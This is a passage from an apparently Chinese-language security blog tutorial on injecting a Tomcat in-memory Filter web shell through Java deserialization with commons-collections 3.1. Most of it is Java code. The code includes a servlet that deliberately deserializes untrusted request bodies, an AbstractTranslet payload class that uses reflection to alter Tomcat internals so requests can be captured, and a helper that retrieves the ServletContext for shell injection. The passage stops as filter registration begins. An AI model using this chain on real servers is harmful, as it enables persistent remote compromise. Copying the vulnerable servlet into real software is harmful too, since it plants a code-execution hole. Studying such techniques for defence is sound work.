</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> EvilServlet <span style="color:#fff;font-weight:bold">extends</span> HttpServlet {
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doGet(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        InputStream inputStream = req.<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>        ObjectInputStream objectInputStream = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(inputStream);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            objectInputStream.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,Reus09!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doPost(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        InputStream inputStream = req.<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>        ObjectInputStream objectInputStream = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(inputStream);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            objectInputStream.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,Reus09!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>pom.xml</code>里面添加<code>commons-collections</code>依赖</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>commons-collections<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>commons-collections<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>3.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="反序列化注入">反序列化注入<a hidden class="anchor" aria-hidden="true" href="#反序列化注入">#</a></h3>
<h4 id="步骤一">步骤一<a hidden class="anchor" aria-hidden="true" href="#步骤一">#</a></h4>
<p>我们需要创建一个继承了AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）的TomcatEchoInject类，在其代码里面通过反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true，并且对<code>lastServicedRequest</code>和<code>lastServicedResponse</code>这两个ThreadLocal进行初始化，代码与我们在 回显问题 章节的代码基本一致</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.logging.Filter;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.logging.LogRecord;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName TomcatEchoInject
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 21:48
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> TomcatEchoInject <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> updateFinalField(Class aclass,String filedName){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> field = aclass.<span style="color:#007f7f">getDeclaredField</span>(filedName);
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> modifiersField = field.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;modifiers&#34;</span>);
</span></span><span style="display:flex;"><span>            modifiersField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            modifiersField.<span style="color:#007f7f">setInt</span>(field,field.<span style="color:#007f7f">getModifiers</span>() &amp; ~java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Modifier</span>.<span style="color:#007f7f">FINAL</span>);
</span></span><span style="display:flex;"><span>            field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(filedName == <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>){
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span>(!field.<span style="color:#007f7f">getBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>)){
</span></span><span style="display:flex;"><span>                    field.<span style="color:#007f7f">setBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span>(field.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                   field.<span style="color:#007f7f">set</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">new</span> ThreadLocal());
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// 修改WRAP_SAME_OBJECT 值为 true
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#007f7f">// 修改final 的值
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            String WRAP_SAME_OBJECT_NAME = <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>;
</span></span><span style="display:flex;"><span>            String lastServicedRequestName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>;
</span></span><span style="display:flex;"><span>            String lastServicedResponseName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedResponse&#34;</span>;
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; applicationDispatcherClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span>);
</span></span><span style="display:flex;"><span>            Class&lt;?&gt; applicationFilterChainClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME);
</span></span><span style="display:flex;"><span>            updateFinalField(applicationFilterChainClass,lastServicedRequestName);
</span></span><span style="display:flex;"><span>            updateFinalField(applicationFilterChainClass,lastServicedResponseName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="步骤二">步骤二<a hidden class="anchor" aria-hidden="true" href="#步骤二">#</a></h4>
<p>将 request 和 response 进行取出，然后注入我们的filter。</p>
<h5 id="获得servletcontext">获得ServletContext<a hidden class="anchor" aria-hidden="true" href="#获得servletcontext">#</a></h5>
<p>通过反射获得<code>lastServicedRequest</code>变量，因为其存储的类型是<code>ServletRequest</code>，可以通过<code>get</code>方法获得<code>request</code>，之后通过<code>getServletContext</code>方法获得servletContext</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> ServletContext getServletContext() <span style="color:#fff;font-weight:bold">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
</span></span><span style="display:flex;"><span>    ServletRequest servletRequest = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/*shell注入，前提需要能拿到request、response等*/</span>
</span></span><span style="display:flex;"><span>    Class c = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> f = c.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>);
</span></span><span style="display:flex;"><span>    f.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>    ThreadLocal threadLocal = (ThreadLocal) f.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//不为空则意味着第一次反序列化的准备工作已成功
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (threadLocal != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; threadLocal.<span style="color:#007f7f">get</span>() != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>        servletRequest = (ServletRequest) threadLocal.<span style="color:#007f7f">get</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">assert</span> servletRequest != <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    ServletContext servletContext = servletRequest.<span style="color:#007f7f">getServletContext</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> servletContext;
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="注册filter">注册Filter<a hidden class="anchor" aria-hidden="true" href="#注册filter">#</a></h5>
<p>其实这里直接根据我们之前在<code>Tomcat内存马</code>文章里面提到的注册Filter内存马的方法一样，直接初始化添加<code>FilterDef</code>、然后通过<code>StandarContext</code>获取FilterConfigs、手动构造FilterConfig,FilterMap,最后一一添加即可。</p>
<p>这里根据大师傅的博客，学习一下另一条注册Filter的路线，其实原理都是大同小异。</p>
